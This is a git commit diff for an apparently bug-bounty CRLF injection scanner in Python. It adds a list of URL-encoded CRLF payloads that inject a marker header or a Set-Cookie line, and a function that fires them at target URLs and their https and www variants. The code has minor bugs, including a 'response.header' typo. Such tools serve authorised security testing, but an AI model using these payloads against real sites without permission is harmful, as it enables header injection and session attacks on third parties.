9348803a75ae2038b3ad570bc2657bfdd74f0870
machinexa <machinexa@gmail.com>
2020-09-23 15:54:32 +0545

    03:54:32 PM 09/23/2020

--- lib/Functions.py
+++ lib/Functions.py
@@ -1,15 +1,130 @@
+from requests import Session   
 from termcolor import colored
-from lib.Globals import ColorObj
+from random import randint as rdi
+from requests.exceptions import Timeout
+from requests.exceptions import ConnectionError
+
+from lib.Globals import ColorObj, UA
 
 def banner():
     from pyfiglet import print_figlet as puff
     puff('CRLF Injector', font='larry3d', colors='BLUE')
-    print(colored('CRLF injection in path, parameter and netlocs!', color='red', attrs=['bold']))
+    print(colored('A smart CRLF Injector, which can inject CRLF in path, parameter and netloc!', color='red', attrs=['bold']))
+    print(colored('It intelligently fuzzes in parameters and path', color='red', attrs=['bold']))
 
 def starter(argv):
     if argv.banner:
         banner()
         exit(0)
-    if not argv.wordlist or not argv.domain or not argv.output_directory or not argv.threads:
+    if not argv.wordlist or not argv.domain or not argv.output_directory:
         print("{} Use --help".format(ColorObj.bad))
         exit()
+
+def request_to_try(url: str) -> tuple:
+    print(f"{ColorObj.information} Trying {colored(url, color='cyan')} against web server!")
+    isReturnable = False
+    s = Session()
+    try:
+        if rdi(0,1) == 0:
+            response = s.get(url, timeout=8)
+        elif rdi(0,1) == 1:
+            response = s.head(url, timeout=8, headers=UA)
+        else:
+            response = s.head(url, timeout=8)
+    except ConnectionError:
+        print(f"{ColorObj.bad} Cant connect to url: {url}")
+        return url, False
+    except Timeout:
+        print(f"{ColorObj.bad} Coudlnt connect in time: {url}")
+        return url, False
+    except Exception as E:
+        print(f"{ColorObj.bad} Exception {E},{E.__class__} occured")
+        return url, False
+    
+    try:
+        print(f"{ColorObj.good} Response header: {response.headers['evil-here']}")
+        isReturnable = True
+    except:
+        pass
+    try:
+        print(f"{ColorObj.good} Response Cookie: {response.cookies['bugbounty']}")
+        isReturnable = True
+    except:
+        pass 
+    
+    if isReturnable:
+        return url, True
+    
+    ssl_url = url.replace('http://', 'https://')
+    print(f"{ColorObj.information} Trying {colored(ssl_url, color='cyan')} against web server!")
+    try:
+        if rdi(0,1) == 0:
+            response = s.get(ssl_url, timeout=8, headers=UA)
+        elif rdi(0,1) == 1:
+            response = s.head(ssl_url, timeout=8)
+        else:
+            response = s.head(ssl_url, timeout=8)
+    except ConnectionError:
+        print(f"{ColorObj.bad} Cant connect to url: {ssl_url}")
+        return ssl_url, False
+    except Timeout:
+        print(f"{ColorObj.bad} Coudlnt connect in time: {ssl_url}")
+        return ssl_url, False
+    except Exception as E:
+        print(f"{ColorObj.bad} Exception {E},{E.__class__} occured")
+        return ssl_url, False
+
+    try:
+        print(f"{ColorObj.good} Response header: {response.headers['evil-here']}")
+        isReturnable = True
+    except:
+        pass
+    try:
+        print(f"{ColorObj.good} Response Cookie: {response.cookies['bugbounty']}")
+        isReturnable = True
+    except:
+        pass 
+    if isReturnable:
+        return ssl_url, True 
+    if 'www.' in ssl_url:
+        print(f"{ColorObj.other} www already exist in url {url}")
+        return url, False
+    if url.count('.') >= 2:
+        print(f"{ColorObj.other} Skipping www for subdomain {url}")
+        return url, False
+    try:
+        ssl_url = None
+        if rdi(0,100) < 36:
+            www_url = url.replace('http://', 'https://www.')
+        else:
+            www_url = url.replace('http://', 'http://www.')
+        print(f"{ColorObj.information} Trying {colored(www_url, color='cyan')} against web server!")
+        try:
+            if rdi(0,1) == 0:
+                response = s.get(www_url, timeout=8)
+            else:
+                response = s.head(www_url, timeout=8, headers=UA)
+        except ConnectionError:
+            print(f"{ColorObj.bad} Cant connect to url: {www_url}")
+            return www_url, False
+        except Timeout:
+            print(f"{ColorObj.bad} Cant connect to url: {www_url}")
+            return www_url, False
+        except Exception as E:
+            print(f"{ColorObj.bad} Exception {E}, {E.__class__} occured")
+            return www_url, False
+        try:
+            print(f"{ColorObj.good} Response header: {response.header['evil-here']}")
+            isReturnable = True
+        except:
+            pass
+        try:
+            print(f"{ColorObj.good} Response header: {response.cookies['bugbounty']}")
+            isReturnable = True
+        except:
+            pass
+        if isReturnable:
+            return www_url, True
+    except Exception as E:
+        print(f"{ColorObj.bad} Unexpected error {E},{E.__class__} in request to try function")
+    return url, False
--- lib/Globals.py
+++ lib/Globals.py
@@ -1,2 +1,32 @@
-from lib.ColoredObject import Color
-ColorObj = Color()
+from lib.ColoredObject import Color as Cobj
+payloads = [
+"/%0aevil-here:bugbountyplz",
+"/%0d%0aevil-here:bugbountyplz",
+"/%25%30aevil-here:bugbountyplz",
+"/%250aevil-here:bugbountyplz",
+"/%3f%0d%0aevil-here:bugbountyplz",
+"/%3f%0aevil-here:bugbountyplz",
+"/%u000aevil-here:bugbountyplz",
+"/%26%0aevil-here:bugbountyplz",
+"/%26%0d%0aSet-Cookie:bugbounty=bugbountyplz",
+"/%23%0d%0aSet-Cookie:bugbounty=bugbountyplz",
+"/%23%0aSet-Cookie:bugbounty=bugbountyplz",
+"/%2F..%0d%0aSet-Cookie:bugbounty=bugbountyplz",
+"/%u000a%u000dSet-Cookie:bugbounty=bugbountyplz",
+"/%3B%0d%0aSet-Cookie:bugbounty=bugbountyplz",
+"/%3B%0aSet-Cookie:bugbounty=bugbountyplz",
+"/%E5%98%8A%E5%98%8DSet-Cookie:bugbounty=bugbountyplz",
+]
+UA = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36',
+    'X-Bug-Bounty': 'machinexa'
+}
+ColorObj = Cobj()
+
+to_try = []
+
+#"/%23%0aevil-here:bugbountyplz",
+#"/%23%0devil-here:bugbountyplz",
+#"/%2f%2e%2e%0d%0aevil-here:bugbountyplz",
+#"/%3f%0d%0aSet-Cookie:bugbounty=bugbountyplz",
+#"/%3f%0dSet-Cookie:bugbounty=bugbountyplz",
